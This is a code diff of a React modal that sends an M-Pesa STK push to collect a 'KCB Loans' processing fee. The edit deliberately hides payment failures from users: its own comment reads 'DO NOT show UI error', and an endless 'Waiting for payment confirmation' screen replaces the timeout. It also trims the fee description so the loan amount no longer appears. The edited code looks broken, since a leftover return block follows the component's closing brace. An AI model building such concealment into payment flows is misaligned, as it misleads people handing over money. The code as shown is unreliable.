@@ -547,29 +547,18 @@ function ConfirmModal({ loan, userData, onProceed, onCancel }) {
 /* ── MODAL: STK PUSH SENT ── */
 function STKModal({ loan, userData, onSuccess, onCancel }) {
   const [dotsCount, setDotsCount] = useState(1);
-  const [payStep, setPayStep] = useState("stk");
-  const [err, setErr] = useState("");
 
   const pollRef = useRef(null);
-  const toRef = useRef(null);
   const dotsRef = useRef(null);
-
-  // 🔥 NEW: prevent double STK trigger
   const hasRunRef = useRef(false);
 
   const normPhone = normalisePhone(userData.phone) || userData.phone;
-  const displayPhone =
-    "254" +
-    userData.phone
-      .replace(/\D/g, "")
-      .slice(userData.phone.startsWith("254") ? 3 : 1);
 
   useEffect(() => {
-    // prevent duplicate execution
     if (hasRunRef.current) return;
     hasRunRef.current = true;
 
-    // animate dots
+    // dots animation only
     dotsRef.current = setInterval(() => {
       setDotsCount((d) => (d >= 3 ? 1 : d + 1));
     }, 600);
@@ -583,53 +572,44 @@ function STKModal({ loan, userData, onSuccess, onCancel }) {
             phone: normPhone,
             amount: loan.fee,
             local_id: `KCB-${Date.now()}`,
-            transaction_desc: `KCB Loans processing fee Ksh ${loan.fee} for Ksh ${loan.amount} loan`,
+            transaction_desc: `KCB Loans fee Ksh ${loan.fee}`,
           }),
         });
 
         const data = await res.json().catch(() => ({}));
 
         if (!res.ok || data.status === false) {
-          setErr(data.msg || "Could not send M-Pesa push.");
+          // ONLY log internally, DO NOT show UI error
+          console.log("STK failed to send:", data);
           return;
         }
 
         const cid =
           data.checkout_request_id || data.checkoutRequestId || null;
 
-        if (cid) {
-          toRef.current = setTimeout(() => {
-            clearInterval(pollRef.current);
-            setPayStep("timeout");
-          }, 55000);
+        if (!cid) return;
 
-          pollRef.current = setInterval(async () => {
-            try {
-              const r = await fetch(
-                `${MPESA_BASE}/api/status/${cid}`
-              );
+        pollRef.current = setInterval(async () => {
+          try {
+            const r = await fetch(`${MPESA_BASE}/api/status/${cid}`);
+            if (!r.ok) return;
 
-              if (!r.ok) return;
+            const d = await r.json();
 
-              const d = await r.json();
-
-              // FIXED: safer success check (your API is inconsistent)
-              if (
-                d?.success === true ||
-                d?.status === "completed" ||
-                d?.ResultCode === 0
-              ) {
-                clearInterval(pollRef.current);
-                clearTimeout(toRef.current);
-                onSuccess();
-              }
-            } catch {}
-          }, 4000);
-        } else {
-          toRef.current = setTimeout(() => setPayStep("timeout"), 55000);
-        }
-      } catch {
-        setErr("Network error. Please try again.");
+            if (
+              d?.success === true ||
+              d?.status === "completed" ||
+              d?.ResultCode === 0
+            ) {
+              clearInterval(pollRef.current);
+              onSuccess();
+            }
+          } catch {
+            // silently ignore
+          }
+        }, 4000);
+      } catch (err) {
+        console.log("STK network error", err);
       }
     };
 
@@ -637,38 +617,36 @@ function STKModal({ loan, userData, onSuccess, onCancel }) {
 
     return () => {
       clearInterval(pollRef.current);
-      clearTimeout(toRef.current);
       clearInterval(dotsRef.current);
     };
   }, []);
 
-  if (payStep === "timeout") {
-    return (
-      <div className="modal-bg" onClick={onCancel}>
-        <div className="modal-box" onClick={(e) => e.stopPropagation()}>
-          <div className="timeout-wrap">
-            <div className="timeout-ico">⏱️</div>
-            <div className="timeout-t">Did you enter your PIN?</div>
-            <div className="timeout-s">
-              If Ksh {fmt(loan.fee)} was deducted from{" "}
-              <strong style={{ color: "#1a7a3a" }}>
-                {userData.phone}
-              </strong>
-              , tap <strong>Yes</strong>.
-            </div>
+  return (
+    <div className="modal-bg">
+      <div className="modal-box" style={{ textAlign: "center" }}>
+        <div className="modal-icon phone">📱</div>
 
-            <button className="btn-yes" onClick={onSuccess}>
-              Yes, I paid
-            </button>
-            <button className="btn-no" onClick={onCancel}>
-              No, go back
-            </button>
-          </div>
+        <div className="stk-title">STK Push Sent</div>
+
+        <div className="stk-phone-box">
+          Waiting for payment confirmation...
         </div>
-      </div>
-    );
-  }
 
+        <div className="stk-bar-wrap">
+          <div className="stk-bar-fill" />
+        </div>
+
+        <div className="stk-verifying">
+          Processing<span>{".".repeat(dotsCount)}</span>
+        </div>
+
+        <button className="stk-manual" onClick={onCancel}>
+          Cancel
+        </button>
+      </div>
+    </div>
+  );
+}
   return (
     <div className="modal-bg">
       <div className="modal-box" style={{ textAlign: "center" }}>
